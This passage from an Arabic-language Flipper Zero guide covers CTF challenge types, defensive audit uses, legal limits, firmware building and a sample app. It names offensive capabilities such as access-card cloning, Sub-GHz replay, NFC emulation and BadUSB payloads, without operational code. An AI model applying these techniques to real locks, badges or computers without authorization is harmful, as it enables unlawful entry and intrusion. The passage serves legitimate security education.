- استنساخ بطاقة دخول لفتح صندوق مقفل يحتوي على علم
- إعادة إرسال إشارة Sub-GHz لفتح باب محاكى
- فك إشارة IR لاستعادة رسالة مخفية
- محاكاة وسم NFC للمصادقة كمستخدم آخر
- استخدام BadUSB لتنفيذ حمولة على جهاز يحضره صاحبه

تسهّل ميزة التسجيل المدمجة وسعة بطاقة SD الكبيرة أرشفة كل إشارة تجمعها أثناء فعالية CTF لتحليلها لاحقًا.

## الاستخدامات الدفاعية

تستخدم فرق الأمن Flipper Zero لتدقيق بيئاتها:

- **تدقيق البطاقات** — اقرأ بطاقات الدخول في المنشأة لتحديد أنظمة EM4100 أو Mifare Classic غير الآمنة التي ينبغي ترقيتها إلى DESfire EV2 أو إصدار أحدث.
- **تدقيق الأجهزة اللاسلكية** — حدد جميع أجهزة Sub-GHz واكشف أنظمة الشفرات الثابتة.
- **اختبار سياسة BadUSB** — تحقّق من أن سياسات قفل أجهزة USB HID تعمل كما ينبغي.
- **تدقيق أجهزة تحكم IR** — تأكد من عدم إمكانية التحكم بالمعدات الحساسة عبر جهاز تحكم شامل بالأشعة تحت الحمراء.
- **اختبار قابلية استنساخ وسوم NFC** — تحقق مما إذا كان يمكن استنساخ وسوم NFC على المنتجات أو بيانات الاعتماد.

## اعتبارات قانونية وأخلاقية

Flipper Zero أداة مشروعة لأبحاث الأمن، ويمكن أيضًا إساءة استخدامها. يعتمد تعرضك للمساءلة القانونية على الولاية القضائية والسياق.

### ما يكون قانونيًا عمومًا (بالتفويض)

- اختبار الأجهزة التي تملكها
- اختبار اختراق مصرح به بموجب بيان عمل موقع
- بحث أمني في بيئة مختبر مضبوطة
- قراءة بطاقات الدخول وأجهزة التحكم التي تملكها
- المشاركة في مسابقات CTF معتمدة

### ما يكون غير قانوني عمومًا

- إعادة إرسال إشارة باب مرآب لا تملكه بغرض الدخول
- استنساخ بطاقة دخول تتيح دخول مبنى غير مصرح لك بدخوله
- إرسال إطارات إلغاء مصادقة إلى شبكة لا تتحكم بها
- استخدام BadUSB ضد كمبيوتر دون تفويض مكتوب
- اعتراض اتصالات خاصة (عبر Sub-GHz أو غيره) في معظم الولايات القضائية

في **الولايات المتحدة**، تشمل القوانين ذات الصلة Computer Fraud and Abuse Act (CFAA)، وقانون خصوصية الاتصالات الإلكترونية (ECPA)، وقواعد لجنة الاتصالات الفيدرالية (FCC) الخاصة بإرسال الترددات الراديوية. وفي **الاتحاد الأوروبي** توجد حماية مماثلة بموجب قوانين الجرائم الحاسوبية الوطنية وتوجيه معدات الراديو.

*لا تحظر FCC امتلاك أو استخدام جهاز يستطيع استقبال إشارات Sub-GHz. لكن الإرسال غير المرخص على ترددات معينة محظور. تعمل معظم أجهزة Sub-GHz الاستهلاكية ضمن نطاقات ISM غير المرخصة (315 MHz و433 MHz و915 MHz)، وتكون مستويات الطاقة المنخفضة المستخدمة عادةً ضمن حدود Part 15.*

حاولت كندا منع استيراد Flipper Zero في 2024 بسبب مخاوف سرقة السيارات. كان ذلك إلى حد كبير ردًا سياسيًا على التغطية الإعلامية لهجمات ترحيل مفاتيح السيارات، لا مخاوف تقنية دقيقة؛ إذ تستخدم أنظمة الدخول الحديثة دون مفتاح شفرات متغيرة، ولا يستطيع Flipper تجاوزها من دون عتاد إضافي.

## إعداد بيئة التطوير

### بناء البرنامج الثابت الرسمي

```bash
git clone --recursive https://github.com/flipperdevices/flipperzero-firmware.git
cd flipperzero-firmware

# تثبيت سلسلة الأدوات (Linux/macOS)
./fbt

# بناء البرنامج الثابت
./fbt fap_dist

# تمريره عبر USB
./fbt flash_usb_full
```

تتولى **FBT (أداة بناء Flipper)** تثبيت سلسلة الأدوات وجلب الاعتماديات وتنظيم عملية البناء تلقائيًا. تحتاج إلى Python 3.8 أو أحدث ومترجم ARM GCC.

### كتابة تطبيق مخصص

تستخدم التطبيقات تنسيق **Flipper Application Package (FAP)**. يوجد كل تطبيق في مجلد ضمن `applications_user/` أو `applications/`.

```c
#include <furi.h>
#include <gui/gui.h>

static void my_app_draw_callback(Canvas* canvas, void* ctx) {
// هيكل FAP أساسي؛ الخط الافتراضي يدعم ASCII فقط، لذا تبقى التحية بالإنجليزية.
    canvas_draw_str(canvas, 10, 32, "Hello, Flipper!");
}

int32_t my_app_main(void* p) {
    UNUSED(p);
    ViewPort* view_port = view_port_alloc();
    view_port_draw_callback_set(view_port, my_app_draw_callback, NULL);

    Gui* gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(gui, view_port, GuiLayerFullscreen);

    furi_delay_ms(3000);

    gui_remove_view_port(gui, view_port);
    view_port_free(view_port);
    furi_record_close(RECORD_GUI);
    return 0;
}
```

تتفاعل التطبيقات مع عتاد Flipper عبر واجهة **Furi (تنفيذ السجل العام لـ Flipper)**. ويعتمد الوصول إلى الأنظمة الفرعية على السجلات: افتح سجلًا باسمه، واحصل على مؤشر إلى النظام الفرعي، واستخدمه، ثم أغلق السجل.

### بنية مجلدات بطاقة SD

يتوقع Flipper وجود مجلدات محددة على بطاقة SD:

| المجلد | المحتويات |
|-----------|---------|
| `subghz/` | التقاطات Sub-GHz المحفوظة (ملفات .sub) |
| `nfc/` | تفريغات NFC المحفوظة (ملفات .nfc) |
| `lfrfid/` | مفاتيح RFID منخفض التردد المحفوظة (ملفات .rfid) |
| `infrared/` | أجهزة تحكم IR المحفوظة (ملفات .ir) |
| `ibutton/` | مفاتيح iButton المحفوظة (ملفات .ibtn) |
| `badusb/` | حمولات DuckyScript (ملفات .txt) |
| `apps/` | تطبيقات FAP من جهات خارجية |
| `music_player/` | ملفات موسيقى .fmf |
| `dolphin/` | بيانات حفظ خبرة Dolphin |
